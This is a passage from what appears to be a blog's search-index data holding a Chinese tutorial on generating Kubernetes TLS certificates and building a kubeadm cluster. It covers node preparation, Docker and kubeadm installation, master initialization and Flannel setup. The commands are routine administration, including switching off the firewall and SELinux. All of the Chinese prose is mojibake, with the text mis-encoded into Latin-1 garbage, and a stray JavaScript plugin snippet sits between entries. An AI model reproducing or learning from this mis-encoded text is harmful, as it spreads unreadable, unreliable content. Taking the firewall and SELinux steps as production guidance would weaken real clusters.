-profile=kubernetes server-csr.json | cfssljson -bare server# æŸ¥çœ‹ç”Ÿæˆç»“æœ# lsca-config.json ca.csr ca-csr.json ca-key.pem ca.pem server.csr server-csr.json server-key.pem server.pem# éªŒè¯è¯ä¹¦# cfssl-certinfo -cert server.pem# openssl x509 -noout -text -in server.pem å‚è€ƒåšå®¢ Kubernetes SSL è¯ä¹¦æ¢³ç† Kubernetes åˆ›å»º TLS è¯ä¹¦å’Œç§˜é’¥ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å®¹å™¨åŒ–"},{title:"Kubernetes ä¹‹ä¸€ç‰¹æ€§ä¸ Kubeadm æ–¹å¼æ­å»ºé›†ç¾¤",url:"/posts/b728042a.html",text:'Kubernetes æ¦‚è¿°Kubernetes ç®€ä»‹Kubernetes æ˜¯ Google å¼€æºçš„ä¸€ä¸ªå®¹å™¨ç¼–æ’å¼•æ“ï¼Œç®€ç§° K8sï¼Œæ˜¯ç”¨ 8 ä»£æ›¿ 8 ä¸ªå­—ç¬¦ ubernete è€Œæˆçš„ç¼©å†™ã€‚Kubernetes å¯ç”¨äºç®¡ç†äº‘å¹³å°ä¸­å¤šä¸ªä¸»æœºä¸Šçš„å®¹å™¨åŒ–çš„åº”ç”¨ï¼Œæ”¯æŒè‡ªåŠ¨åŒ–éƒ¨ç½²ã€å¤§è§„æ¨¡æ‰©ç¼©å®¹ã€åº”ç”¨å®¹å™¨åŒ–ç®¡ç†ã€‚åœ¨ç”Ÿäº§ç¯å¢ƒä¸­éƒ¨ç½²ä¸€ä¸ªåº”ç”¨ç¨‹åºæ—¶ï¼Œé€šå¸¸è¦éƒ¨ç½²è¯¥åº”ç”¨çš„å¤šä¸ªå®ä¾‹ä»¥ä¾¿å¯¹åº”ç”¨è¯·æ±‚è¿›è¡Œè´Ÿè½½å‡è¡¡ã€‚Kubernetes æä¾›äº†åº”ç”¨éƒ¨ç½²ã€è§„åˆ’ã€æ›´æ–°ã€ç»´æŠ¤çš„ä¸€ç§æœºåˆ¶ã€‚åœ¨ Kubernetes ä¸­ï¼Œå¯ä»¥åˆ›å»ºå¤šä¸ªå®¹å™¨ï¼Œæ¯ä¸ªå®¹å™¨é‡Œé¢è¿è¡Œä¸€ä¸ªåº”ç”¨å®ä¾‹ï¼Œç„¶åé€šè¿‡å†…ç½®çš„è´Ÿè½½å‡è¡¡ç­–ç•¥ï¼Œå®ç°å¯¹è¿™ä¸€ç»„åº”ç”¨å®ä¾‹çš„ç®¡ç†ã€å‘ç°ã€è®¿é—®ï¼Œè€Œè¿™äº›ç»†èŠ‚éƒ½ä¸éœ€è¦è¿ç»´äººå‘˜å»è¿›è¡Œå¤æ‚çš„æ‰‹å·¥é…ç½®å’Œå¤„ç†ã€‚ å„ç§éƒ¨ç½²æ–¹å¼çš„åŒºåˆ«ä¼ ç»Ÿçš„åº”ç”¨éƒ¨ç½²æ–¹å¼æ˜¯é€šè¿‡æ’ä»¶æˆ–è„šæœ¬æ¥å®‰è£…åº”ç”¨ï¼Œè¿™æ ·åšçš„ç¼ºç‚¹æ˜¯åº”ç”¨çš„è¿è¡Œã€é…ç½®ã€ç®¡ç†ã€æ‰€æœ‰ç”Ÿå­˜å‘¨æœŸå°†ä¸å½“å‰æ“ä½œç³»ç»Ÿç»‘å®šï¼Œè¿™æ ·åšå¹¶ä¸åˆ©äºåº”ç”¨çš„å‡çº§æ›´æ–°ã€å›æ»šç­‰æ“ä½œï¼›å½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡åˆ›å»ºè™šæ‹Ÿæœºçš„æ–¹å¼æ¥å®ç°æŸäº›åŠŸèƒ½ï¼Œä½†æ˜¯è™šæ‹Ÿæœºéå¸¸é‡ï¼Œå¹¶ä¸åˆ©äºå¯ç§»æ¤æ€§ã€‚æ–°çš„æ–¹å¼æ˜¯é€šè¿‡éƒ¨ç½²å®¹å™¨æ–¹å¼å®ç°ï¼Œæ¯ä¸ªå®¹å™¨ä¹‹é—´äº’ç›¸éš”ç¦»ï¼Œæ¯ä¸ªå®¹å™¨æœ‰è‡ªå·±çš„æ–‡ä»¶ç³»ç»Ÿï¼Œå®¹å™¨ä¹‹é—´è¿›ç¨‹ä¸ä¼šç›¸äº’å½±å“ï¼Œèƒ½åŒºåˆ†è®¡ç®—èµ„æºã€‚ç›¸å¯¹äºè™šæ‹Ÿæœºï¼Œå®¹å™¨èƒ½å¤Ÿå¿«é€Ÿéƒ¨ç½²ï¼Œç”±äºå®¹å™¨ä¸åº•å±‚è®¾æ–½ã€æœºå™¨æ–‡ä»¶ç³»ç»Ÿè§£è€¦çš„ï¼Œæ‰€ä»¥å®ƒèƒ½åœ¨ä¸åŒäº‘ã€ä¸åŒç‰ˆæœ¬æ“ä½œç³»ç»Ÿé—´è¿›è¡Œè¿ç§»ã€‚å®¹å™¨å ç”¨èµ„æºå°‘ã€éƒ¨ç½²å¿«ï¼Œæ¯ä¸ªåº”ç”¨å¯ä»¥è¢«æ‰“åŒ…æˆä¸€ä¸ªå®¹å™¨é•œåƒï¼Œæ¯ä¸ªåº”ç”¨ä¸å®¹å™¨é—´æˆä¸€å¯¹ä¸€å…³ç³»ä¹Ÿä½¿å®¹å™¨æœ‰æ›´å¤§ä¼˜åŠ¿ï¼Œä½¿ç”¨å®¹å™¨å¯ä»¥åœ¨ build æˆ– release çš„é˜¶æ®µï¼Œä¸ºåº”ç”¨åˆ›å»ºå®¹å™¨é•œåƒï¼Œå› ä¸ºæ¯ä¸ªåº”ç”¨ä¸éœ€è¦ä¸å…¶ä½™çš„åº”ç”¨å †æ ˆç»„åˆï¼Œä¹Ÿä¸ä¾èµ–äºç”Ÿäº§ç¯å¢ƒåŸºç¡€ç»“æ„ï¼Œè¿™ä½¿å¾—ä»ç ”å‘åˆ°æµ‹è¯•ã€ç”Ÿäº§èƒ½æä¾›ä¸€è‡´ç¯å¢ƒã€‚ç±»ä¼¼åœ°ï¼Œå®¹å™¨æ¯”è™šæ‹Ÿæœºè½»é‡ã€æ›´ â€œé€æ˜â€ï¼Œè¿™æ›´ä¾¿äºç›‘æ§å’Œç®¡ç†ã€‚ Kubernetes åŠŸèƒ½ä»‹ç» è‡ªåŠ¨è£…ç®±ï¼šåŸºäºå®¹å™¨å¯¹åº”ç”¨è¿è¡Œç¯å¢ƒçš„èµ„æºé…ç½®è¦æ±‚è‡ªåŠ¨éƒ¨ç½²åº”ç”¨å®¹å™¨ è‡ªæˆ‘ä¿®å¤ï¼šå½“å®¹å™¨è¿è¡Œå¤±è´¥æ—¶ï¼Œä¼šå¯¹å®¹å™¨è¿›è¡Œé‡å¯ï¼›å½“æ‰€éƒ¨ç½²çš„ Node èŠ‚ç‚¹æœ‰é—®é¢˜æ—¶ï¼Œä¼šå¯¹å®¹å™¨è¿›è¡Œé‡æ–°éƒ¨ç½²å’Œé‡æ–°è°ƒåº¦ï¼›å½“å®¹å™¨æœªé€šè¿‡ç›‘æ§æ£€æŸ¥æ—¶ï¼Œä¼šå…³é—­æ­¤å®¹å™¨ç›´åˆ°å®¹å™¨æ­£å¸¸è¿è¡Œæ—¶ï¼Œæ‰ä¼šå¯¹å¤–æä¾›æœåŠ¡ æ°´å¹³æ‰©å±•ï¼šé€šè¿‡ç®€å•çš„å‘½ä»¤ã€ç”¨æˆ· UI ç•Œé¢æˆ–åŸºäº CPU ç­‰èµ„æºä½¿ç”¨æƒ…å†µï¼Œå¯¹åº”ç”¨å®¹å™¨è¿›è¡Œè§„æ¨¡æ‰©å¤§æˆ–è§„æ¨¡å‰ªè£ æœåŠ¡å‘ç°ï¼šç”¨æˆ·ä¸éœ€ä½¿ç”¨é¢å¤–çš„æœåŠ¡å‘ç°æœºåˆ¶ï¼Œå°±èƒ½å¤ŸåŸºäº Kubernetes è‡ªèº«èƒ½åŠ›å®ç°æœåŠ¡å‘ç°å’Œè´Ÿè½½å‡è¡¡ æ»šåŠ¨æ›´æ–°ï¼šå¯ä»¥æ ¹æ®åº”ç”¨çš„å˜åŒ–ï¼Œå¯¹åº”ç”¨å®¹å™¨è¿è¡Œçš„åº”ç”¨ï¼Œè¿›è¡Œä¸€æ¬¡æ€§æˆ–æ‰¹é‡å¼æ›´æ–° ç‰ˆæœ¬å›é€€ï¼šå¯ä»¥æ ¹æ®åº”ç”¨éƒ¨ç½²æƒ…å†µï¼Œå¯¹åº”ç”¨å®¹å™¨è¿è¡Œçš„åº”ç”¨ï¼Œè¿›è¡Œå†å²ç‰ˆæœ¬å³æ—¶å›é€€ å¯†é’¥å’Œé…ç½®ç®¡ç†ï¼šåœ¨ä¸éœ€è¦é‡æ–°æ„å»ºé•œåƒçš„æƒ…å†µä¸‹ï¼Œå¯ä»¥éƒ¨ç½²å’Œæ›´æ–°å¯†é’¥å’Œåº”ç”¨é…ç½®ï¼Œç±»ä¼¼çƒ­éƒ¨ç½² å­˜å‚¨ç¼–æ’ï¼šè‡ªåŠ¨å®ç°å­˜å‚¨ç³»ç»ŸæŒ‚è½½åŠåº”ç”¨ï¼Œè¿™ç‰¹åˆ«å¯¹æœ‰çŠ¶æ€åº”ç”¨å®ç°æ•°æ®æŒä¹…åŒ–éå¸¸é‡è¦ï¼›å­˜å‚¨ç³»ç»Ÿå¯ä»¥æ¥è‡ªäºæœ¬åœ°ç›®å½•ã€ç½‘ç»œå­˜å‚¨ï¼ˆNFSã€Glusterã€Ceph ç­‰ï¼‰ã€å…¬å…±äº‘å­˜å‚¨æœåŠ¡ æ‰¹å¤„ç†ï¼šæä¾›ä¸€æ¬¡æ€§ä»»åŠ¡ï¼Œå®šæ—¶ä»»åŠ¡ï¼Œæ»¡è¶³æ‰¹é‡æ•°æ®å¤„ç†å’Œåˆ†æçš„åœºæ™¯ Kubernetes æ¶æ„åº”ç”¨éƒ¨ç½²æ¶æ„åˆ†ç±» æ— ä¸­å¿ƒèŠ‚ç‚¹æ¶æ„ï¼šGlusterFS æœ‰ä¸­å¿ƒèŠ‚ç‚¹æ¶æ„ï¼šHDFSã€K8S Kubernetes é›†ç¾¤æ¶æ„ Kubernetes é›†ç¾¤æ¶æ„èŠ‚ç‚¹è§’è‰² Masterï¼ˆä¸»æ§èŠ‚ç‚¹ï¼‰ï¼šKubernetes é›†ç¾¤æ§åˆ¶èŠ‚ç‚¹ï¼Œè´Ÿè´£å¯¹é›†ç¾¤è¿›è¡Œè°ƒåº¦ç®¡ç†ï¼Œæ¥å—é›†ç¾¤å¤–çš„ç”¨æˆ·å»é›†ç¾¤æ“ä½œè¯·æ±‚ã€‚Master ç”± API Serverã€Schedulerã€ClusterState Storeï¼ˆETCD å­˜å‚¨ç³»ç»Ÿï¼‰å’Œ Controller MangerServer ç»„æˆ Schedulerï¼šèŠ‚ç‚¹è°ƒåº¦ï¼Œé€‰æ‹© Node èŠ‚ç‚¹æ¥åº”ç”¨éƒ¨ç½² API Serverï¼šé›†ç¾¤ç»Ÿä¸€å…¥å£ï¼Œä»¥ RESTful æ¥å£å°†æ•°æ®äº¤ç»™ ETCD å­˜å‚¨ç³»ç»Ÿ Controller MangerServerï¼šå¤„ç†é›†ç¾¤ä¸­çš„å¸¸è§„åå°ä»»åŠ¡ï¼Œä¸€ä¸ªèµ„æºå¯¹åº”ä¸€ä¸ªæ§åˆ¶å™¨ Nodeï¼ˆå·¥ä½œèŠ‚ç‚¹ï¼‰ï¼šKubernetes é›†ç¾¤å·¥ä½œèŠ‚ç‚¹ï¼Œè´Ÿè´£è¿è¡Œç”¨æˆ·ä¸šåŠ¡åº”ç”¨å®¹å™¨ï¼ŒNode ç”± Kubeletã€Kube-Proxy å’Œ ContainerRuntime ç»„æˆ Kubeletï¼šè´Ÿè´£ Pod å¯¹åº”çš„å®¹å™¨çš„åˆ›å»ºã€å¯åœç®¡ç†ï¼Œä¸ Master èŠ‚ç‚¹åä½œï¼Œå®ç°é›†ç¾¤ç®¡ç†çš„åŸºæœ¬åŠŸèƒ½ Kube-Proxyï¼šæä¾› Kubernetes çš„é€šä¿¡ä¸è´Ÿè½½å‡è¡¡åŠŸèƒ½çš„é‡è¦ç»„ä»¶ Kubernetes æ ¸å¿ƒæ¦‚å¿µ Kubernetes é›†ç¾¤æ­å»ºé›†ç¾¤æ­å»ºæ–¹å¼ç›®å‰ç”Ÿäº§ç¯å¢ƒæ­å»º Kubernetes é›†ç¾¤ä¸»è¦æœ‰ä»¥ä¸‹ä¸¤ç§æ–¹å¼ï¼š Kubeadmï¼šKubeadm æ˜¯ä¸€ä¸ª Kubernetes éƒ¨ç½²å·¥å…·ï¼Œæä¾› kubeadm init å’Œ kubeadm join å‘½ä»¤ï¼Œå¯ç”¨äºå¿«é€Ÿæ­å»º Kubernetes é›†ç¾¤ äºŒè¿›åˆ¶åŒ…ï¼šä» Github ä¸‹è½½å‘è¡Œç‰ˆçš„äºŒè¿›åˆ¶åŒ…ï¼Œæ‰‹åŠ¨éƒ¨ç½²æ¯ä¸ªç»„ä»¶ï¼Œç»„æˆ Kubernetes é›†ç¾¤ã€‚Kubeadm è™½ç„¶é™ä½éƒ¨ç½²é—¨æ§›ï¼Œä½†å±è”½äº†å¾ˆå¤šç»†èŠ‚ï¼Œé‡åˆ°é—®é¢˜å¾ˆéš¾æ’æŸ¥ã€‚å¦‚æœæƒ³æ›´å®¹æ˜“å¯æ§ï¼Œç”Ÿäº§ç¯å¢ƒæ¨èä½¿ç”¨äºŒè¿›åˆ¶åŒ…æ­å»º Kubernetes é›†ç¾¤ï¼Œè™½ç„¶æ‰‹åŠ¨éƒ¨ç½²æ¯”è¾ƒéº»çƒ¦ï¼Œä½†æœŸé—´å¯ä»¥å­¦ä¹ å¾ˆå¤šå·¥ä½œåŸç†ï¼Œä¹Ÿåˆ©äºåæœŸç»´æŠ¤ é›†ç¾¤æ­å»ºè¦æ±‚æ­å»º Kubernetes é›†ç¾¤éœ€è¦æ»¡è¶³ä»¥ä¸‹å‡ ä¸ªæ¡ä»¶ï¼š ä¸€å°æˆ–å¤šå°æœºå™¨ï¼Œå»ºè®®æ“ä½œç³»ç»Ÿ CentOS 7.x86_64 Master èŠ‚ç‚¹çš„ç¡¬ä»¶é…ç½®ï¼š2GB æˆ–æ›´å¤š RAMï¼Œ2 ä¸ª CPU æˆ–æ›´å¤š CPUï¼Œç¡¬ç›˜ 20GB æˆ–æ›´å¤š Node èŠ‚ç‚¹çš„ç¡¬ä»¶é…ç½®ï¼š4GB æˆ–æ›´å¤š RAMï¼Œ4 ä¸ª CPU æˆ–æ›´å¤š CPUï¼Œç¡¬ç›˜ 40GB æˆ–æ›´å¤š é›†ç¾¤ä¸­æ‰€æœ‰æœºå™¨ä¹‹é—´çš„ç½‘ç»œå¯ä»¥äº’é€š ç³»ç»Ÿå†…å¯ä»¥è®¿é—®å¤–ç½‘ï¼Œéœ€è¦æ‹‰å–é•œåƒ ç¦ç”¨ swap åˆ†åŒº é›†ç¾¤æ­å»ºè§„åˆ’Kubernetes é›†ç¾¤æ­å»ºè§„åˆ’åˆ†ä¸ºå• Master é›†ç¾¤å’Œå¤š Master é›†ç¾¤ä¸¤ç§ï¼Œä¸ºäº†æé«˜é›†ç¾¤çš„é«˜å¯ç”¨æ€§ï¼Œç”Ÿäº§ç¯å¢ƒä¸€èˆ¬é‡‡ç”¨åè€…çš„è§„åˆ’æ–¹æ¡ˆï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š Kubeadm æ–¹å¼æ­å»ºå• Master é›†ç¾¤æ­å»ºç›®æ ‡-ï¼ˆ1ï¼‰åœ¨æ‰€æœ‰èŠ‚ç‚¹ä¸Šå®‰è£… Docker å’Œ kubeadm-ï¼ˆ2ï¼‰éƒ¨ç½² Kubernetes Master-ï¼ˆ3ï¼‰éƒ¨ç½²å®¹å™¨ç½‘ç»œæ’ä»¶-ï¼ˆ4ï¼‰éƒ¨ç½² Kubernetes Nodeï¼Œå°†èŠ‚ç‚¹åŠ å…¥ Kubernetes é›†ç¾¤ä¸­-ï¼ˆ5ï¼‰éƒ¨ç½² Dashboard Web é¡µé¢ï¼Œå¯è§†åŒ–æŸ¥çœ‹ Kubernetes èµ„æº è½¯ä»¶ç¯å¢ƒ è½¯ä»¶ ç‰ˆæœ¬ å®‰è£…æ–¹å¼ CentOS 7.9 3.10.0-1160.15.2.el7.x86_64 è™šæ‹Ÿæœº Docker docker-ce-18.06.1.ce-3.el7 YUM Kubelet 1.18.0 YUM Kubeadm 1.18.0 YUM Kubectl 1.18.0 YUM Dashboard 2.0.3 Kubernetes æœåŠ¡å™¨è§„åˆ’ Host Name è§’è‰² IP CPU Memory Disk k8s-master master 192.168.31.61 &gt;= 2C &gt;=2G &gt;=20G k8s-node1 node 192.168.31.62 &gt;= 4C &gt;=4G &gt;=40G k8s-node2 node 192.168.31.63 &gt;= 4C &gt;=4G &gt;=40G k8s-node3 node 192.168.31.64 &gt;= 4C &gt;=4G &gt;=40G ç³»ç»Ÿåˆå§‹åŒ–å€¼å¾—ä¸€æçš„æ˜¯ï¼Œä»¥ä¸‹ç³»ç»Ÿåˆå§‹åŒ–æ“ä½œéƒ½å¿…é¡»åœ¨æ‰€æœ‰èŠ‚ç‚¹ä¸Šæ‰§è¡Œä¸€æ¬¡ï¼Œé‡ç‚¹åŒ…æ‹¬åœ¨æ‰€æœ‰èŠ‚ç‚¹é‡Œå®‰è£… Dockerã€Kubeletã€Kubeadmã€‚è¿™é‡Œè¦æ±‚ Kubeletã€Kubeadmã€Kubectl çš„ç‰ˆæœ¬ä¸ Docker çš„ç‰ˆæœ¬äº’ç›¸åŒ¹é…ï¼ˆå…¼å®¹ï¼‰ï¼Œä¸å»ºè®®å®‰è£…æœ€æ–°ç‰ˆæœ¬çš„ Dockerï¼Œå› ä¸º Kubernetes å¯¹æœ€æ–°ç‰ˆçš„ Docker å…¼å®¹ä¸å¤ŸåŠæ—¶ï¼Œå®¹æ˜“å¯¼è‡´ Kubeadm æ–¹å¼æ­å»º Kubernetes é›†ç¾¤å¤±è´¥ã€‚ å…³é—­é˜²ç«å¢™ 12345# ä¸´æ—¶å…³é—­# systemctl stop firewalld# æ°¸ä¹…å…³é—­# systemctl disable firewalld å…³é—­ selinux 12345# ä¸´æ—¶å…³é—­# setenforce 0# æ°¸ä¹…å…³é—­# sed -i \'s/enforcing/disabled/\' /etc/selinux/config å…³é—­ swap 12345# ä¸´æ—¶å…³é—­$ swapoff -a# æ°¸ä¹…å…³é—­# sed -i \'s/.*swap.*/#&amp;/\' /etc/fstab ç³»ç»Ÿæ—¶é—´åŒæ­¥ 12345# å®‰è£…æ—¶é—´åŒæ­¥å·¥å…·# yum install ntpdate -y# è®¾ç½®æ—¶é—´åŒæ­¥æœåŠ¡å™¨# ntpdate time.windows.com å®‰è£… Dockerï¼Œè¿™æ˜¯ç”±äº Kubernetes é»˜è®¤çš„ CRIï¼ˆå®¹å™¨è¿è¡Œæ—¶ï¼‰ä¸º Docker 1234567891011121314151617181920212223242526# æ·»åŠ YUMæº# wget https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo -O /etc/yum.repos.d/docker-ce.repo# å®‰è£…Dockerï¼ˆæŒ‡å®šç‰ˆæœ¬å·ï¼Œå¦åˆ™é»˜è®¤å®‰è£…æœ€æ–°ç‰ˆæœ¬ï¼‰# yum -y install docker-ce-18.06.1.ce-3.el7# å¼€æœºè‡ªå¯åŠ¨Docker# systemctl enable docker# å¯åŠ¨Docker# systemctl start docker# é…ç½®é˜¿é‡Œçš„Dockeré•œåƒåŠ é€Ÿ# vim /etc/docker/daemon.json{ "registry-mirrors": ["https://b9pmyelo.mirror.aliyuncs.com"]}# é‡å¯Docker# systemctl restart docker# æŸ¥çœ‹Dockerçš„ç‰ˆæœ¬# docker --version# æŸ¥çœ‹Dockerçš„å®‰è£…ä¿¡æ¯# docker info å®‰è£… Kubeletã€Kubeadmã€Kubectl 1234567891011121314151617# æ·»åŠ YUmæº# vim /etc/yum.repos.d/kubernetes.repo[kubernetes]name=Kubernetesbaseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64/enabled=1gpgcheck=0repo_gpgcheck=0gpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg# å®‰è£…ï¼ˆæŒ‡å®šç‰ˆæœ¬å·ï¼Œå¦åˆ™é»˜è®¤ä¼šå®‰è£…æœ€æ–°ç‰ˆæœ¬ï¼‰# yum install -y kubelet-1.18.0 kubeadm-1.18.0 kubectl-1.18.0# å¼€æœºè‡ªå¯åŠ¨Kubelet# systemctl enable kubelet# æç¤ºï¼šKubeletå®‰è£…å®Œæˆåä¸éœ€è¦æ‰‹åŠ¨å¯åŠ¨ï¼Œå› ä¸ºåœ¨NodeèŠ‚ç‚¹æˆåŠŸåŠ å…¥é›†ç¾¤ä¹‹å‰ï¼ŒKubeletè‡ªèº«ä¼šä¸æ–­é‡å¯ï¼ˆæœŸé—´ä¼šä¼´éšç€å„ç§å¯åŠ¨é”™è¯¯ï¼Œè¿™ç‚¹ä¸ç”¨åœ¨æ„ï¼‰ å°†æ¡¥æ¥çš„ IPv4 æµé‡ä¼ é€’åˆ° iptables çš„é“¾ 1234567# æ·»åŠ è·¯ç”±è§„åˆ™# vim /etc/sysctl.d/k8s.confnet.bridge.bridge-nf-call-iptables = 1net.bridge.bridge-nf-call-ip6tables = 1# é…ç½®ç”Ÿæ•ˆ# sysctl --system è®¾ç½®ä¸»æœºå 1# hostnamectl set-hostname &lt;hostname&gt; æ·»åŠ  hostsï¼ˆMaster å’Œå„ Node èŠ‚ç‚¹éƒ½é…ç½®ï¼‰ 123456# æ·»åŠ hosts# vim /etc/hosts192.168.31.61 k8s-master192.168.31.62 k8s-node1192.168.31.63 k8s-node2192.168.31.64 k8s-node3 éƒ¨ç½² Master èŠ‚ç‚¹åœ¨ Master èŠ‚ç‚¹æ‰§è¡Œ Kubeadm åˆå§‹åŒ–æ“ä½œï¼Œ--service-cidr ä¸ --pod-network-cidr ä¸€èˆ¬éƒ½ä¸éœ€è¦æ›´æ”¹ï¼Œè¯¦ç»†å‚æ•°è¯´æ˜å¦‚ä¸‹ï¼Œç‚¹å‡»æŸ¥çœ‹è¯¦ç»†çš„å®‰è£…æ—¥å¿—ä¿¡æ¯ --apiserver-advertise-addressï¼šMaster èŠ‚ç‚¹çš„ IP åœ°å€ --kubernetes-versionï¼šKubernetes çš„ç‰ˆæœ¬å·ï¼Œå¿…é¡»ä¸ä¸Šé¢ Kubelet çš„ç‰ˆæœ¬å·ä¸€è‡´ --apiserver-advertise-addressï¼šä¸€èˆ¬æŒ‡å®šä¸º Haproxy + Keepalived çš„ VIP --image-repositoryï¼šç”±äºé»˜è®¤æ‹‰å–é•œåƒåœ°å€ k8s.gcr.io å›½å†…æ— æ³•è®¿é—®ï¼ŒæŒ‡å®šé˜¿é‡Œäº‘é•œåƒä»“åº“åœ°å€ --pod-network-cidrï¼šæŒ‡å®š Pod Network çš„åœ°å€èŒƒå›´ï¼Œç”±äº Kubernetes æ”¯æŒå¤šç§ç½‘ç»œæ–¹æ¡ˆï¼Œè€Œä¸”ä¸åŒç½‘ç»œæ–¹æ¡ˆå¯¹å‚æ•°æœ‰å„è‡ªè¦æ±‚ï¼Œè®¾ç½®ä¸º 10.244.0.0/16 è¡¨ç¤ºä½¿ç”¨ Flannel ç½‘ç»œæ–¹æ¡ˆ 1234567891011121314151617181920212223242526# æ‰§è¡Œåˆå§‹åŒ–# kubeadm init \\--apiserver-advertise-address=192.168.31.61 \\--image-repository registry.aliyuncs.com/google_containers \\--kubernetes-version v1.18.0 \\--service-cidr=10.96.0.0/12 \\--pod-network-cidr=10.244.0.0/16# å½“ç»ˆç«¯æ‰“å°å¦‚ä¸‹çš„æç¤ºä¿¡æ¯ï¼Œåˆ™è¯´æ˜Dockerå¼€å§‹æ‹‰å–é•œåƒï¼Œè¿™ä¸ªè¿‡ç¨‹æ¯”è¾ƒè€—æ—¶ï¼ˆä¸¥é‡ä¾èµ–ç½‘é€Ÿï¼‰[preflight] Pulling images required for setting up a Kubernetes cluster[preflight] This might take a minute or two, depending on the speed of your internet connection[preflight] You can also perform this action in beforehand using \'kubeadm config images pull\'# åˆå§‹åŒ–å®Œæˆåï¼Œè®°å½•ä¸‹ç»ˆç«¯æœ€åæ‰“å°çš„Kubeadmå‘½ä»¤ï¼ˆå¦‚ä¸‹ï¼‰ï¼Œåç»­æ·»åŠ NodeèŠ‚ç‚¹åˆ°é›†ç¾¤æ—¶ä¼šä½¿ç”¨åˆ°### kubeadm join 192.168.1.109:6443 --token jve1cd.3ulp5fqifsptti23 --discovery-token-ca-cert-hash sha256:01229ee179cf13855dbf38bc050b3251928571996d60878f30ce13c08aaa62d5# æŸ¥çœ‹Dockerçš„é•œåƒåˆ—è¡¨# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEregistry.aliyuncs.com/google_containers/kube-proxy v1.18.0 43940c34f24f 11 months ago 117MBregistry.aliyuncs.com/google_containers/kube-apiserver v1.18.0 74060cea7f70 11 months ago 173MBregistry.aliyuncs.com/google_containers/kube-controller-manager v1.18.0 d3e55153f52f 11 months ago 162MBregistry.aliyuncs.com/google_containers/kube-scheduler v1.18.0 a31f78c7c8ce 11 months ago 95.3MBregistry.aliyuncs.com/google_containers/pause 3.2 80d28bedfe5d 13 months ago 683kBregistry.aliyuncs.com/google_containers/coredns 1.6.7 67da37a9a360 13 months ago 43.8MBregistry.aliyuncs.com/google_containers/etcd 3.4.3-0 303ce5db0e90 16 months ago 288MB åœ¨ Master èŠ‚ç‚¹é…ç½® Kubectl å·¥å…· 1234567891011121314151617# åˆ›å»ºç›®å½•# mkdir -p $HOME/.kube# æ‹·è´é…ç½®æ–‡ä»¶# cp -i /etc/kubernetes/admin.conf $HOME/.kube/config# æ–‡ä»¶æˆæƒ# chown $(id -u):$(id -g) $HOME/.kube/config# æŸ¥è¯¢ç»„ä»¶çš„çŠ¶æ€# kubectl get csNAME STATUS MESSAGEERROR etcd-0 Healthy {"health":"true"}controller-manager Healthy okscheduler Healthy ok# æç¤ºï¼šå½“ä¸Šé¢çš„ STATUS ç»“æœéƒ½ä¸º "Healthy"ï¼Œè¡¨ç¤ºç»„ä»¶å¤„äºå¥åº·çŠ¶æ€ï¼Œå¦åˆ™éœ€è¦æ£€æŸ¥é”™è¯¯ï¼Œå¦‚æœæ’é™¤ä¸äº†é—®é¢˜ï¼Œå¯ä»¥ä½¿ç”¨ "kubeadm reset" å‘½ä»¤é‡ç½®é›†ç¾¤åé‡æ–°åˆå§‹åŒ– Master èŠ‚ç‚¹å®‰è£… Flannel ç½‘ç»œæ’ä»¶æŸ¥çœ‹é›†ç¾¤çŠ¶æ€ï¼Œæ­¤æ—¶çš„ Master å¤„äº â€œNotReadyâ€ï¼ˆæœªå°±ç»ªï¼‰ï¼Œè¿™æ˜¯å› ä¸ºé›†ç¾¤ä¸­å°šæœªå®‰è£… Flannel ç½‘ç»œæ’ä»¶ï¼Œéƒ¨ç½²å®Œç½‘ç»œæ’ä»¶åçŠ¶æ€ä¼šè‡ªåŠ¨å˜ä¸º Ready 1234# æŸ¥çœ‹é›†ç¾¤çŠ¶æ€# kubectl get nodesNAME STATUS ROLES AGE VERSIONk8s-master NotReady master 12m v1.18.0 å®‰è£… Flannel ç½‘ç»œæ’ä»¶ï¼Œè‹¥ kubectl apply -f å‘½ä»¤æ‰§è¡Œåæç¤ºç½‘ç»œè¿æ¥å¤±è´¥ï¼Œå¯ç•™æ„æ–‡ç« åé¢ç»™å‡ºçš„è§£å†³æ–¹æ¡ˆ 12345678910111213141516# å®‰è£…Flannelç½‘ç»œæ’ä»¶# kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml# æŸ¥è¯¢Podç»„ä»¶çš„çŠ¶æ€# kubectl get pods -n kube-systemNAME READY STATUS RESTARTS AGEcoredns-7ff77c879f-67rjn 1/1 Running 0 4m35scoredns-7ff77c879f-xpq9h 1/1 Running 0 4m35setcd-k8s-master 1/1 Running 0 4m44skube-apiserver-k8s-master 1/1 Running 0 4m44skube-controller-manager-k8s-master 1/1 Running 0 4m44skube-flannel-ds-4jtp4 1/1 Running 0 2m36skube-proxy-8bbhk 1/1 Running 0 4m34skube-scheduler-k8s-master 1/1 Running 0 4m44s# æç¤ºï¼šFlannel ç½‘ç»œæ’ä»¶å®‰è£…å®Œæˆåï¼Œéœ€è¦è€å¿ƒç­‰å¾…ä¸€æ®µæ—¶é—´ï¼Œç›´åˆ° "kubectl get pods -n kube-system" å‘½ä»¤æŸ¥è¯¢åˆ°çš„æ‰€æœ‰ Pod ç»„ä»¶çš„çŠ¶æ€éƒ½ä¸º Running ä¸ºæ­¢ å½“ Master èŠ‚ç‚¹å¤„äº Ready çŠ¶æ€ï¼Œå°±å¯ä»¥å¼€å§‹å°† Node èŠ‚ç‚¹åŠ å…¥é›†ç¾¤ 1234# æŸ¥çœ‹é›†ç¾¤çŠ¶æ€# kubectl get nodesNAME STATUS ROLES AGE VERSIONk8s-master Ready master 12m 